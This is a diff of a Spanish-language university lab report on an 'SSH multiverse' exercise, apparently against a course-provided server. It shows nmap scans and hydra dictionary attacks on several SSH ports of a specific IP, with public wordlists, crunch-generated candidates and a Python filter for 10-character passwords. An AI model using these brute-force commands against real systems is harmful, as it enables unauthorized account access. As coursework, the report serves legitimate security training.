@@ -1,10 +1,10 @@
 # Práctica 4 - SSH multiverse
 
-Azpeitia García Karyme Ivette
-
-Pedro Méndez Jose Manuel 
+La práctica se realizó de forma individual debido a que cada integrante del equipo contaba con un usuario y contraseña diferente por lo que se dará la explicación de dos distintos procesos correspondientes a cada integrante.
 
 ## Procedimiento.
+
+```Pedro Méndez Jose Manuel ```
 
 ### Escanear el objetivo
 
@@ -94,6 +94,7 @@ PORT     STATE SERVICE VERSION
 	* 2202/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
 	* **_2220/tcp open  netiq?_**.
 	* 2222/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+
 
 
 * Obtendremos más información realizando unas conecciones vía ssh:
@@ -360,8 +361,170 @@ La parte más sencilla, basta que ejecuten $ touch $NumeroDeCuenta para dejar re
 PLANTILLA
 ```
 ------
+## Procedimiento.
+
+```Azpeitia García Karyme Ivette```
+
+### Escanear el objetivo
+ 
+Se realizó un escaneo de puertos con el objetivo de encontrar aquellos que se encuentran activos escuchando by SSH, para esto se uso ```nmap```
+
+
+
+| ![](img/img1.png)
+|:----------------------:|
+| Resultado al usar `nmap 44.199.201.139 -sV -Pn -sT` 
+
+Encontrando los siguientes puertos activos y aceptables para nuestro objetivo:
+
+``` bash
+PORT     STATE SERVICE VERSION
+	* 222/tcp  open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2200/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2222/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+```
+
+### Atacar el objetivo:
+
+Ahora que sabemos los puertos disponibles procedemos a realizar un ataque de diccionario, para esto necesitamos dos herramientas.
+
+- Hydra 
+
+Necesitamos un sofware que nos permita ejecutar ciberataques de fuerza bruta en cuentas de servicios, para poder intalarlo utilizamos lo siguiente: 
+
+``` bash
+brew install hydra
+```
+ 
+- WordList 
+
+Con el sofware ya instalado procedemos a buscar wordlist publicas para realizar el ataque.
+
+Las primeras wordList que se usaron fueron las que nos proporciona Kali Linux.
+
+``` bash
+root@kali:~# ls -lh /usr/share/wordlists/
+total 51M
+lrwxrwxrwx 1 root root  25 Jan  3 13:59 dirb -> /usr/share/dirb/wordlists
+lrwxrwxrwx 1 root root  30 Jan  3 13:59 dirbuster -> /usr/share/dirbuster/wordlists
+lrwxrwxrwx 1 root root  35 Jan  3 13:59 dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
+lrwxrwxrwx 1 root root  41 Jan  3 13:59 fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
+lrwxrwxrwx 1 root root  45 Jan  3 13:59 fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
+lrwxrwxrwx 1 root root  46 Jan  3 13:59 metasploit -> /usr/share/metasploit-framework/data/wordlists
+lrwxrwxrwx 1 root root  41 Jan  3 13:59 nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
+-rw-r--r-- 1 root root 51M Mar  3  2013 rockyou.txt.gz
+lrwxrwxrwx 1 root root  34 Jan  3 13:59 sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
+lrwxrwxrwx 1 root root  25 Jan  3 13:59 wfuzz -> /usr/share/wfuzz/wordlist
+root@kali:~#
+root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz
+root@kali:~#
+root@kali:~# wc -l /usr/share/wordlists/rockyou.txt; ls -lah /usr/share/wordlists/rockyou.txt
+14344392 /usr/share/wordlists/rockyou.txt
+-rw-r--r-- 1 root root 134M Mar  3  2013 /usr/share/wordlists/rockyou.txt
+root@kali:~#
+```
+
+#### Primer intento de ataque 
+
+Para nuestro primer ataque se uso lo siguiente
+
+``` bash
+hydra -l 317340385 -P /Users/kary_agarcia/Downloads/wordlists -f  -s 222 44.199.201.139 ssh 
+
+hydra -l 317340385 -P /Users/kary_agarcia/Downloads/wordlists -f  -s 2200 44.199.201.139 ssh 
+
+hydra -l 317340385 -P /Users/kary_agarcia/Downloads/wordlists -f  -s 2222 44.199.201.139 ssh 
+```
+
+Realizando un total de *34,768* intentos y sin éxito.
+
+### Segundo intento 
+
+Se buscaron nuevas wordList en los siguientes sitios:
+
+- [SecList-Github](https://github.com/danielmiessler/SecLists)
+- [Weakpass](https://weakpass.com/download)
+- [CrackStation](https://crackstation.net)
+- [Pwdb-Public] (https://github.com/ignis-sec/Pwdb-Public)
+
+
+Se realiza nuevamente los ataques sin tener éxito. 
+
+### Tercer intento
+
+Debido a las fallas en los ataques anteriores decidimos hacer un nuevo **escaneo de puertos** usando nuevamente  `nmap 44.199.201.139 -sV -Pn -sT`
+
+``` bash
+PORT     STATE SERVICE VERSION
+	* 222/tcp  open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2200/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2202/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2222/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 2220 -----
+	* 22022/tcp open  ssh     OpenSSH 6.6.1p1 Debian 5 (protocol 2.0)
+	* 22222 -----
+```
+
+Probando nuevamente las wordList en los nuevos puertos, seguimos sin tener éxito.
+
+### Cuarto intento 
+
+Por lo anterior decidimos usar la herramienta de `crunch` para generar nuestra propia wordList, ya que se recibió un correo del ayudante "Iván Galindo" comentando que la contraseña que se me fue asignada era de longitud 10  y con al menos 5 números.
+
+
+``` bash
+ crunch 10 10 0123456789abcdefghijklmnopqrstuvwxyz -o /Users/kary_agarcia/Documents/3/START -c 50000 
+```
+
+Sin embargo el número de archivos fue muy grande por lo que solo se pudo evaluar la mitad de las combinaciones posibles, sin tener éxito.
+
+### Quinto intento 
+
+Procedemos a programar en `python` una herramienta que nos permita filtrar las wordList (mencionadas anteriormente) que cumplan con las siguientes caracteristicas:
+
+- Tener longitud 10
+- Cada palabra debe tener al menos 5 números.
+
+Se uso el siguiente código:
+
+``` python
+# Abrir arhivo de wordList
+with open('archivoWordList.txt', 'r') as input_file:
+
+    # Abre el archivo de salida 
+    with open('/Users/kary_agarcia/Documents/CyS/out.txt', 'w') as output_file:
+
+        # Ciclo en cada línea en el archivo de entrada
+        for line in input_file:
+
+            # Tomar palabras individuales
+            words = line.split()
+
+            # Ciclo sobre cada palabra en la línea
+            for word in words:
+
+                # Se checa si la palabra es de longitud 10
+                if len(word) == 10:
+
+                    # Contador de números en la palabra
+                    num_digits = sum(1 for c in word if c.isdigit())
+
+                    # Verifica si se tienen al menos 5 números
+                    if num_digits >= 5:
+
+                        # Se escribe la palabra en el archivo de salida, 
+						# si cumple lo anterior
+                        output_file.write(word + '\n')
+
+``` 
+
+seguimos intentando, ahora usando la WordList generada con el código anterior.
+
+------
 📢⌨️ with ❤️ by [Jose-MPM](https://github.com/Jose-MPM) 😊⌨️ and [Kary-GOD](https://github.com/Kary-AG) 😊⌨️🎁
 
+
+Encontrando los siguientes puertos activos y aceptables para nuestro objetivo:
 
 
  hydra -s 2222 -l 315073120 -P /home/ntory/CyS/p04/mas_palabras.txt 44.199.201.139 -f ssh
